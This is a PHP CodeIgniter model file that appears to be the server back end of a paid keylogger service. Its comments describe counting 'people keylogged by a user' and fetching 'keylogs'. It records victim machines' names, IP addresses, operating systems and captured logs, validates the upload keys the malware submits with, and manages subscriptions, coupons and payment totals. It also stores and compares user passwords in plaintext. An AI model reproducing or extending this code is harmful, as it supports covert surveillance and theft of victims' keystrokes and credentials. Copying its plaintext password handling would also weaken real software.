<?php 
class Manage extends CI_Model {

	// Check if the given credentials are valid.
	function checkCredentials($username, $password)
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=? and password=? limit 1', array($username, $password));
		// Check if the query ran.
		if ($query) {
			// Check if the query returned 1 result.
			if ($query->num_rows() > 0) {
				// Credentials are valid, return true.
				return true;
			} else {
				// Credentials are invalid, return false.
				return false;
			}
		}
	}

	// Create a user account.
	function createAccount($username, $email, $password, $upload_key, $hwid)
	{
		// Create the query.
		$query = $this->db->query('insert into users set username=?, email=?, password=?, upload_key=?, hwid=?', array($username, $email, $password, $upload_key, $hwid));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

	// Get the user data of a given user.
	function getuserData()
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=? limit 1', array($this->session->userdata('username')));
		// Check if the query ran.
		if ($query) {
			// Return the data.
			$results = $query->result();
			return $results;
		}
	}

	// Check if a user is banned.
	function isBanned()
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=? limit 1', array($this->session->userdata('username')));
		// Check if the query ran.
		if ($query) {
			$results = $query->result();
			foreach ($results as $result) {
				// Check if the result returned 1.
				if ($result->banned == 1) {
					// The user is banned, return true.
					return true;
				} else {
					// The user isn't banned, return false.
					return false;
				}
			}
		}
	}

	// Update key.
	function generateKey($key)
	{
		// Create the query.
		$query = $this->db->query('update users set upload_key=? where username=?', array($key, $this->session->userdata('username')));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

	// Get UID from a given key.
	function getUIDfromKey($key)
	{
		// Create the query.
		$query = $this->db->query('select * from users where upload_key=? limit 1', array($key));
		// Check if the query ran.
		if ($query) {
			$results = $query->result();
			foreach ($results as $result) {
				return $result->uid;
			}
		} 
	}

	// Get log amount.
	function getlogAmount($uid, $type)
	{
		// Create the query.
		if ($type == 0) {
			$query = $this->db->query('select * from logs where uid=?', array($uid));
		} else {
			$query = $this->db->query('select * from logs where uid=? and type=?', array($uid, $type));
		}
		// Check if the query ran.
		if ($query) {
			return $query->num_rows();
		}
	}

	// Add a log.
	function addLog($uid, $unique_key, $key, $type, $pcname, $ip, $log, $date, $time)
	{
		// Create the query.
		$query = $this->db->query('insert into logs set uid=?, unique_key=?, upload_key=?, type=?, pcname=?, ip=?, log=?, date=?, time=?', array($uid, $unique_key, $key, $type, $pcname, $ip, $log, $date, $time));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

    function couponValid($code)
    {
        // Create the query.
        $query = $this->db->query('select * from gifts where code=? limit 1', array($code));
        // Check if the query ran.
        if ($query) {
            if ($query->num_rows > 0) {
                $results = $query->result();
                $this->db->query('delete from gifts where code=? limit 1', array($code));
                foreach ($results as $result) {
                    return $result->plan;
                }
            } else {
                return false;
            }
        }
    }

    function isAdmin()
    {
        // Create the query.
        $query = $this->db->query('select * from users where username=? limit 1', array($this->session->userdata('username')));
        // Check if the query ran.
        if ($query) {
            $results = $query->result();
            foreach ($results as $result) {
                if ($result->group == '0') {
                    return true;
                } else {
                    return false;
                }
            }
        }
    }

    // Change password.
    function changePassword($new_password)
    {
        // Create the query.
        $query = $this->db->query('update users set password=? where username=?', array($new_password, $this->session->userdata('username')));
        // Check if the query ran.
        if ($query) {
            return true;
        } else {
            return false;
        }
    }

    // Change email.
    function changeEmail($uid, $email)
    {
        // Create the query.
        $query = $this->db->query('update users set email=? where uid=?', array($email, $uid));
        // Check if the query ran.
        if ($query) {
            return true;
        } else {
            return false;
        }
    }

    // Add subscription.
    function addSubscription($uid, $date)
    {
        // Create the query.
        $query = $this->db->query('update users set subscription=?, expiration_date=? where uid=? limit 1', array(1, $date, $uid));
        // Check if the query ran.
        if ($query) {
            return true;
        } else {
            return false;
        }
    }

	// Get HWID.
	function getHWID($username)
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=? limit 1', array($username));
		// Check if the query ran.
		if ($query) {
			$results = $query->result();
			foreach ($results as $result) {
				return $result->hwid;
			}
		}
	}

	// Get's amount of people keylogged by a user.
	function getPCAmount($uid)
	{
		// Create the query.
		$query = $this->db->query('select * from installations where uid=?', array($uid));
		// Check if the query ran.
		if ($query) {
			return $query->num_rows();
		}
	}

	// Delete a log.
	function deleteLog($key)
	{
		// Create the query.
		$query = $this->db->query('delete from logs where unique_key=? limit 1', array($key));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

	// Get keylogs of a given user.
	function getLogs($uid, $type)
	{
		// Create the query.
		$query = $this->db->query('select * from logs where uid=? and type=? order by id DESC', array($uid, $type));
		// Check if the query ran.
		if ($query) {
			// Return the logs.
			return $query->result();
		}
	}

	// Add perm log.
	function addpermLog($uid, $date)
	{
		// Create the query.
		$query = $this->db->query('insert into permlogs set uid=?, date=?', array($uid, $date));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

    // Get amount of active users.
    function userCount()
    {
        // Create the query.
        $query = $this->db->query('select * from users');
        // Check if the query ran.
        if ($query) {
            return $query->num_rows();
        }
    }

    // Get total made.
    function totalMade()
    {
        // Create the query.
        $query = $this->db->query('select * from payments');
        // Check if the query ran.
        if ($query) {
            // Create total amount variable.
            $total = 0;
            $payments = $query->result();
            foreach ($payments as $payment) {
                $total = $total + $payment->amount;
            }
            return $total;
        }
    }

    // Add payment history.
    function addPayment($uid, $payment_method, $txn_id, $amount, $time)
    {
        // Create the query.
        $query = $this->db->query('insert into payments set uid=?, payment_method=?, txn_id=?, amount=?, time=?', array($uid, $payment_method, $txn_id, $amount, $time));
        // Check if the query ran.
        if ($query) {
            return true;
        } else {
            return false;
        }
    }

	// Check if a key is valid.
	function validKey($key)
	{
		// Create the query.
		$query = $this->db->query('select * from users where upload_key=? limit 1', array($key));
		// Check if the query ran.
		if ($query) {
			// Check if the result returned 1.
			if ($query->num_rows() > 0) {
				return true;
			} else {
				return false;
			}
		}
	}

	// Get log amounts for log chart.
	function logsChart($uid, $date)
	{
		if ($date == 'total') {
			// Create the query.
			$query = $this->db->query('select * from permlogs where uid=?', array($uid));
		} else {
			// Create the query.
			$query = $this->db->query('select * from permlogs where uid=? and date=?', array($uid, $date));
		}
			// Check if the query ran.
			if ($query) {
				return $query->num_rows();
			}
	}

    // Get user list.
    function getUsers()
    {
        // Create the query.
        $query = $this->db->query('select * from users');
        // Check if the query ran.
        if ($query) {
            $users = $query->result();
            return $users;
        }
    }

	// Gwt log amounts for PC chart.
	function PCChart($uid, $date, $os)
	{
		if ($date == 'total') {
			// Create the query.
			$query = $this->db->query('select * from installations where uid=? and os=?', array($uid, $os));
		} else {
			// Create the query.
			$query = $this->db->query('select * from installations where uid=? and os=? and date=?', array($uid, $os, $date));
		}
		// Check if the query ran.
		if ($query) {
			return $query->num_rows();
		}

	}

	// Get subscription expiration.
	function getSubscription()
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=?', array($this->session->userdata('username')));
		// Check if the query ran.
		if ($query) {
			$results = $query->result();
			foreach ($results as $result) {
				// Return the subscription expiration.
				return $result->expiration_date;
			}
		}
	}

	// Adds an installation.
	function addInstallation($uid, $key, $os, $pcname, $ip, $date, $time)
	{
		// Create the query.
		$query = $this->db->query('insert into installations set uid=?, upload_key=?, os=?, pcname=?, ip=?, date=?, time=?', array($uid, $key, $os, $pcname, $ip, $date, $time));
		// Check if the query ran.
		if ($query) {
			return true;
		} else {
			return false;
		}
	}

	// Get log.
	function getLog($key)
	{
		// Create the query.
		$query = $this->db->query('select * from logs where unique_key=? limit 1', array($key));
		// Check if the query ran.
		if ($query) {
			return $query->result();
		}
	}

	// Check if a log exists.
	function logExists($key)
	{
		// Create the query.
		$query = $this->db->query('select * from logs where unique_key=? limit 1', array($key));
		// Check if the query ran.
		if ($query) {
			if ($query->num_rows() > 0) {
				// Log exists, return true.
				return true;
			} else {
				// Log doesn't exist, return false.
				return false;
			}
		}
	}

	// Check if a user owns a log.
	function ownsLog($key, $uid)
	{
		// Create the query.
		$query = $this->db->query('select * from logs where unique_key=? and uid=? limit 1', array($key, $uid));
		// Check if the query ran.
		if ($query) {
			if ($query->num_rows() > 0) {
				// User owns the log.
				return true;
			} else {
				// User doesn't own the log.
				return false;
			}
		}
	}

	// Check if a user has a subscription.
	function hasSubscription()
	{
		// Create the query.
		$query = $this->db->query('select * from users where username=? limit 1', array($this->session->userdata('username')));
		// Check if the query ran.
		if ($query) {
			$results = $query->result();
			foreach ($results as $result) {
				// Check if the result returned 1.
				if ($result->subscription == 1) {
					// The user has a subscription, return true.
					return true;
				} else {
					// The user doesn't have a subscription, return false.
					return false;
				}
			}
		}
	}

}